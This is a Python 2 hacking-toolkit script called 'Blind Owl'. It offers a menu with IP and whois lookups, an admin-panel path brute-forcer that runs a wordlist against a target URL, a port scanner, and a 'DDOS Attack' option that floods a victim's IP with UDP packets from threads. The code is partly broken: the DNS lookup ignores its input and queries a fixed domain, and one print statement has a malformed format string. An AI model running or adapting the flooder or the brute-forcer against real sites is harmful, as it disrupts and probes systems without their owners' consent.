import urllib, socket, whois, re, sys, threading, thread, time, requests, urllib2, os, smtplib, dns.resolver, builtwith , pywhois, pythonwhois
from colored import fg, bg, attr
from whois import whois

def main():
    print("""
%s        __________      %s
%s       / ___  ___ \     %s           ___ _ _         _     ___  _   _ _
%s      / / @ \/ @ \ \    %s          | _ ) (_)_ _  __| |   / _ \| | | | |
%s      \ \___/\___/ /    %s          | _ \ | | ' \/ _` |  | (_) | |_| | |__
%s       \____\/____/     %s          |___/_|_|_||_\__,_|   \___/ \___/|____|
%s       /     /\\\\\|    %s 
%s       |     |\\\\\\\   %s                ~ github.com/mostafa-vn
%s        \     \\\\\\\\\ %s                 ~ mostafa-vn.ir
%s         \_____/\\\\\   %s               ~ t.me/white_roze
%s         _||_||_        %s
%s                        %s
  [1] Get Your Public IP                  
  [2] Get WebSite IP                      
  [3] Get Whois From Website                                      
  [4] Admin Finder                         
  [5] Port Scanner                         
  [6] Get Website DNS                            
  [7] Website DetectTech
  [8] DDOS Attack
  """%(fg('cyan_3'), fg('green'), fg('cyan_3'), fg('thistle_1'), fg('cyan_3'), fg('thistle_1'), fg('cyan_3'), fg('thistle_1'), fg('cyan_3'), fg('thistle_1'), fg('cyan_3'), fg('green'), fg('cyan_3'), fg('light_magenta'), fg('cyan_3'), fg('light_magenta'), fg('cyan_3'), fg('light_magenta'), fg('cyan_3'), fg('red'), fg('plum_4'), fg('dark_sea_green_2')))
os.system('clear')
main()

put = raw_input('%s%s Enter an Option: %s%s'%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))

def PublicIP():
    Ip = urllib.urlopen("http://api.ipify.org/").read()
    print('%s%s %s %s'%(fg('green'), attr('bold'),Ip, attr('reset')))
if put == '1':
    PublicIP()

def GetHost():
    url = raw_input('%s%s Pleas Enter WebSite URL: %s %s'%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))
    ip = socket.gethostbyname(url)
    print('%s%s %s %s'%(fg('green'), attr('bold'), ip, attr('reset')))
if put == '2':
    GetHost()

def WhoisWeb():
    domain = raw_input('%s%s Enter The Website URL: %s%s'%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))
    w = pythonwhois.get_whois(domain)
    # print(w)
    whois =  w['contacts']['registrant']
    print('%s%s %s %s'%(fg('green'), attr('bold'), whois, attr('reset')))
if put == '3':
    WhoisWeb()

def AdminFinder():
    f = open('list','r')
    link = raw_input('%s%s Enter Target URL >>>%s %shttp://'%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))
    while True:
        sub_link = f.readline()
        if not sub_link:
            break
        req_link = 'http://' + link + '/' + sub_link
        req = urllib2.Request(req_link)
        try:
            response = urllib2.urlopen(req_link)
        except urllib2.HTTPError:
            continue
        except urllib2.URLError:
            continue
        else:
            print('%s%s %s %s%'(fg('green'), attr('bold'), req_link, attr('reset')))
if put == '4':
    AdminFinder()

def PortScanner():
    ip = raw_input('%s%s Enter Target IP %s %s: '%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))
    port_name = ['SSL','HTTP','FTP','SSH','TELNET','SMTP','DNS','POP3','SFTP','RPC','NetBIOS','IMAP','IRC','SMB','MSSQL','MYSQL','Remote Desktop','PCAnyWhere','VNC','Warcraft III']
    port_number = [443,80,21, 22, 23, 25, 53, 110, 115, 135, 139, 143, 194, 445, 1433, 3306, 3389, 5632, 5900, 6112]
    ports = dict(zip(port_number,port_name))
    for port in port_number:
        s = socket.socket()
        try:
            if s.connect_ex((ip,port)) == 0:
                print '%s%s [+] Port %s %s open %s'%(fg('green'), attr('bold'), str(port), ports[port], attr('reset'))
                s.close()
        except socket.error:
            s.close()
if put == '5':
    PortScanner()

def DNS():
    get = raw_input('%s%s Enter Website URL: %s%s'%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))
    domain = 'mostafa-vn.ir'
    answer = dns.resolver.query(domain, 'NS')
    for i in answer.response.answer:
        print'%s%s %s %s'%(fg('green'), attr('bold'), i.to_text(), attr('reset'))
if put == '6':
    DNS()

def WebTech():
    # target = raw_input('%s%s Enter Website URL: %s%s'%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))
    # print(builtwith.parse(target))
    print('in script dar update baadi ok mishe')
if put == '7':
    WebTech()

def dos(i):
	while True:	
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
			print('%s%s Sended%s'%(fg('green'), attr('bold'), attr('reset')))
			time.sleep(0.1)
if put == '8':
    victim_addr = raw_input('%s%s Enter Website URL: > http://%s%s'%(fg('white'), attr('bold'), attr('reset'), fg('light_magenta')))
    thread_count = 1
    victim_ip = socket.gethostbyname(victim_addr)
    UDP_PORT = 80
    MESSAGE = "DOS ATTACK!!!"
    time.sleep(1)
    for i in xrange(thread_count):
        try:
            thread.start_new_thread(dos, ("Thread-"+str(i),))
        except KeyboardInterrupt:
                sys.exit(0)
    while 1:
        pass
